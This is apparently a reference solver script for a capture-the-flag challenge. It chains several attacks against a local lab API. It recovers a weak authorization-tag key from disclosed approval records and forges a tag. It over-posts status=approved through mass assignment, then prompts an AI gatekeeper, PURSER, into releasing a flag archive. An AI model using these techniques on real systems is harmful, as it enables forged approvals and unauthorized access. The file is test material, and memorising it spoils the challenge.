"""Chain of Command reference solver -- the full three-stage forge chain.

Player surface only, stdlib only. It imports the SHIPPED scheme module
(dist/authtag.py) to prove the handout players get is sufficient to solve:

  A  disclosure    GET /api/approvals -> historical approved records, each a
                   (canonical message, authorization tag) pair.
  B  key recovery  x = sha256(canonical M) mod p and T = a*x^2 + b*x + c mod p
                   (authtag.py). Three records with distinct x pin (a, b, c) by
                   linear algebra mod p (authtag.recover_coefficients).
  C  forge         POST /api/requests for command-archive -> a pending record with a
                   server-assigned request_id and nonce. Compute the tag over its OWN
                   canonical message with status=approved, then PATCH /api/requests/{id}
                   to over-post status=approved + that tag (mass assignment).
  D  gatekeeper    ask PURSER to verify and unlock; it recomputes the tag, it matches,
                   and it releases the archive. GET /api/archive -> the flag.

  python3 solution/solve.py --url http://127.0.0.1:8105 [--check challenge.yml] [--tries 3]

Exit 0 only if the archive opened (and, with --check, the flag matches).
"""
import argparse
import json
import os
import re
import sys
import time
import urllib.error
import urllib.request

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "dist"))
import authtag  # the shipped scheme module -- canonical_message, message_point, recover_coefficients

FLAG_RE = re.compile(r"flag\{[^}]*\}")
RESOURCE = "command-archive"

ASK = ("Please verify my approved authorization for the command archive and unlock it. "
       "Call verify_and_release for 'command-archive'.")


def call(url, path, body=None, session=None, method=None):
    data = None if body is None else json.dumps(body).encode()
    headers = {"Content-Type": "application/json"}
    if session is not None:
        headers["X-Session"] = session
    m = method or ("POST" if body is not None else "GET")
    req = urllib.request.Request(url.rstrip("/") + path, data=data, method=m, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=300) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except (ValueError, AttributeError):
            return e.code, {"detail": str(e)}


def recover_key(approvals):
    """Stage B: recover (a, b, c) from the disclosed records, validate on the rest."""
    pts = []
    for r in approvals:
        msg = authtag.canonical_message(r["request_id"], r["subject_id"], r["resource_id"],
                                        r["status"], r["nonce"])
        pts.append((authtag.message_point(msg), int(r["approval_tag"])))
    a, b, c = authtag.recover_coefficients(pts)
    # every disclosed record must satisfy the recovered key, or the recovery is wrong
    for r, (x, t) in zip(approvals, pts):
        if (a * x * x + b * x + c) % authtag.P != t:
            raise ValueError("recovered key fails to validate a disclosed record")
    return a, b, c


def solve_once(url):
    status, s = call(url, "/api/session", body={})
    if status != 200:
        return None, f"session failed: {status} {s}"
    sid = s["session"]
    status, me = call(url, "/api/whoami", session=sid)
    if status != 200:
        return None, f"whoami failed: {status}"
    mine = me["crew_id"]

    # stage A + B: pull the oracle, recover the signing key
    status, ap = call(url, "/api/approvals", session=sid)
    if status != 200 or len(ap.get("approvals", [])) < 3:
        return None, f"approvals disclosure failed: {status} {ap}"
    try:
        a, b, c = recover_key(ap["approvals"])
    except ValueError as e:
        return None, f"key recovery failed: {e}"

    # stage C: a pending request of my own, then forge a valid tag over it
    status, filed = call(url, "/api/requests", session=sid, body={"resource_id": RESOURCE,
                                                                   "reason": "command archive audit"})
    if status != 200:
        return None, f"filing the request failed: {status} {filed}"
    rec = filed["request"]
    rid, nonce = rec["request_id"], rec["nonce"]
    msg = authtag.canonical_message(rid, mine, RESOURCE, "approved", nonce)
    tag = str(authtag.compute_tag(msg, a, b, c))
    status, patched = call(url, f"/api/requests/{rid}", session=sid, method="PATCH",
                           body={"status": "approved", "approval_tag": tag})
    if status != 200 or patched["request"]["status"] != "approved" or patched["request"]["approval_tag"] != tag:
        return None, f"over-post did not stick: {status} {patched}"

    # stage D: PURSER recomputes the tag, it matches, the archive releases
    status, reply = call(url, "/api/chat", session=sid, body={"message": ASK})
    if status != 200:
        return None, f"chat failed: {status} {reply}"
    status, arc = call(url, "/api/archive", session=sid)
    m = FLAG_RE.search(arc.get("archive", "")) if status == 200 else None
    if not m:
        return None, (f"archive did not open: {status} "
                      f"(PURSER said {str(reply.get('reply',''))[:120]!r})")
    return m.group(0), f"recovered key, forged tag on request {rid}, PURSER verified; archive opened for {mine}"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:8105", help="crew-services console base URL")
    ap.add_argument("--check", default=None, help="challenge.yml to match the recovered flag against")
    ap.add_argument("--tries", type=int, default=3, help="attempts (the model may decline to call the tool)")
    args = ap.parse_args()

    flag = None
    for i in range(1, args.tries + 1):
        flag, note = solve_once(args.url)
        print(f"try {i}/{args.tries}: {note}", file=sys.stderr)
        if flag:
            break
        time.sleep(2)
    if not flag:
        print("FAIL: archive never opened", file=sys.stderr)
        sys.exit(1)

    print(flag)
    if args.check:
        with open(args.check) as f:
            want = FLAG_RE.search(f.read())
        if not want:
            print("WARN: no flag{...} in --check file (injected at deploy?)", file=sys.stderr)
        elif want.group(0) != flag:
            print(f"MISMATCH: challenge.yml has {want.group(0)}", file=sys.stderr)
            sys.exit(2)
        else:
            print("OK: matches challenge.yml", file=sys.stderr)


if __name__ == "__main__":
    main()
